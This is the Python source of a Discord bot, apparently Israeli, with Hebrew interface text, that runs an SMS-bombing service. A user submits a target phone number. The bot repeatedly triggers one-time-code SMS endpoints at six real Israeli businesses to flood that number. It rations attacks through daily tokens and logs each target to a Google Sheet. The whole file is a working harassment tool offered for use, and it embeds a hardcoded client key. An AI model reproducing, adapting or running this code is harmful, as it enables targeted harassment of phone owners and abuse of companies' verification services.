import discord
from discord import app_commands
from discord.ext import commands
import os
import requests
import asyncio
from datetime import datetime, timedelta

TOKEN = os.getenv('DISCORD_TOKEN')
GSHEET_URL = os.getenv('GSHEET_URL')

# ניהול נתונים בזיכרון (בשימוש ב-Railway מומלץ לעבור ל-Database בעתיד)
user_tokens = {} # {user_id: message_balance}
user_cooldowns = {} # {user_id: next_claim_time}
active_attacks = {}

class CyberBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()

bot = CyberBot()

# --- פונקציות עזר לטוקנים ---
def can_claim(user_id):
    if user_id not in user_cooldowns: return True
    return datetime.now() >= user_cooldowns[user_id]

def get_balance(user_id):
    return user_tokens.get(user_id, 0)

# --- פונקציית הלוג ---
def send_to_sheet(user_name, user_id, phone, rounds, success, failed):
    if not GSHEET_URL: return
    payload = {
        "user_name": user_name, "user_id": str(user_id), "target_phone": phone,
        "rounds": rounds, "success_count": success, "failed_count": failed
    }
    try: requests.post(GSHEET_URL, json=payload, timeout=10)
    except: print("❌ GSheet Error")

# --- מנוע ה-API ---
def api_request(url, payload=None, method="POST", is_json=True):
    try:
        headers = {"User-Agent": "Mozilla/5.0"}
        if method == "GET": r = requests.get(url, headers=headers, timeout=4)
        else:
            if is_json: r = requests.post(url, json=payload, headers=headers, timeout=4)
            else: r = requests.post(url, data=payload, headers=headers, timeout=4)
        return r.status_code in [200, 201]
    except: return False

async def fire_round(phone):
    tasks = [
        asyncio.to_thread(api_request, "https://users-auth.hamal.co.il/auth/send-auth-code", {"value": phone, "type": "phone", "projectId": "1"}),
        asyncio.to_thread(api_request, "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", {"phoneNumber": phone}),
        asyncio.to_thread(api_request, "https://api.dominos.co.il/sendOtp", {"otpMethod": "text", "customerId": phone, "language": "he", "requestNum": 8}),
        asyncio.to_thread(api_request, "https://app.burgeranch.co.il/_a/aff_otp_auth", {"phone": phone}, is_json=False),
        asyncio.to_thread(api_request, f"https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/{phone}", method="GET"),
        asyncio.to_thread(api_request, "https://api.hopon.co.il/v0.15/1/isr/users", {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": phone, "phoneCall": False})
    ]
    results = await asyncio.gather(*tasks)
    return sum(results), len(results) - sum(results)

# --- לוגיקת הרצה ---
async def start_attack(interaction, phone, rounds):
    uid = interaction.user.id
    
    # בדיקת יתרה (כל סיבוב צורך 6 הודעות מהטוקן)
    needed = int(rounds) * 6
    if get_balance(uid) < needed:
        await interaction.followup.send(f"❌ אין לך מספיק הודעות בטוקן! חסר לך {needed - get_balance(uid)} הודעות.", ephemeral=True)
        return

    active_attacks[uid] = True
    total_s, total_f = 0, 0
    
    for i in range(int(rounds)):
        if not active_attacks.get(uid): break
        s, f = await fire_round(phone)
        total_s += s
        total_f += f
        # עדכון יתרה בזמן אמת
        user_tokens[uid] -= 6 
        await asyncio.sleep(2)
    
    send_to_sheet(interaction.user.name, uid, phone, rounds, total_s, total_f)
    active_attacks.pop(uid, None)

# --- ממשק דיסקורד ---
class AttackControl(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)

    @discord.ui.button(label="🚀 התחל הפצצה", style=discord.ButtonStyle.danger)
    async def start_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        if get_balance(interaction.user.id) < 6:
            return await interaction.response.send_message("❌ הטוקן שלך ריק! לחץ על 'קח טוקן'.", ephemeral=True)
            
        class BombModal(discord.ui.Modal, title="CyberIL Launcher"):
            phone = discord.ui.TextInput(label="מספר טלפון", min_length=10, max_length=10)
            rounds = discord.ui.TextInput(label="סיבובים (עד 20)", default="5")
            async def on_submit(self, modal_inter: discord.Interaction):
                r = int(self.rounds.value)
                if r > 20: r = 20 # הגבלה ל-120 הודעות (20*6)
                await modal_inter.response.send_message(f"⚔️ התקיפה החלה! יתרה נוכחית: {user_tokens[interaction.user.id]}", ephemeral=True)
                asyncio.create_task(start_attack(modal_inter, self.phone.value, r))
        await interaction.response.send_modal(BombModal())

    @discord.ui.button(label="🎫 קח טוקן (120 הודעות)", style=discord.ButtonStyle.success)
    async def claim_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        uid = interaction.user.id
        if can_claim(uid):
            user_tokens[uid] = get_balance(uid) + 120
            user_cooldowns[uid] = datetime.now() + timedelta(hours=24)
            await interaction.response.send_message(f"✅ קיבלת טוקן! היתרה שלך: {user_tokens[uid]} הודעות. תוכל לקחת שוב מחר.", ephemeral=True)
        else:
            wait_time = user_cooldowns[uid] - datetime.now()
            hours = wait_time.seconds // 3600
            minutes = (wait_time.seconds // 60) % 60
            await interaction.response.send_message(f"⏳ כבר לקחת טוקן. נשאר לך לחכות {hours} שעות ו-{minutes} דקות.", ephemeral=True)

    @discord.ui.button(label="🛑 עצור", style=discord.ButtonStyle.secondary)
    async def stop_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        active_attacks[interaction.user.id] = False
        await interaction.response.send_message("🚨 נעצר.", ephemeral=True)

@bot.tree.command(name="setup", description="לוח בקרה")
async def setup(interaction: discord.Interaction):
    balance = get_balance(interaction.user.id)
    embed = discord.Embed(title="⚡ CyberIL SMS System", description=f"היתרה שלך: **{balance}** הודעות", color=0x00FF00)
    embed.add_field(name="חוקים", value="• טוקן אחד ל-24 שעות\n• כל טוקן שווה 120 הודעות\n• מקסימום 20 סיבובים למכה", inline=False)
    await interaction.response.send_message(embed=embed, view=AttackControl())

bot.run(TOKEN)
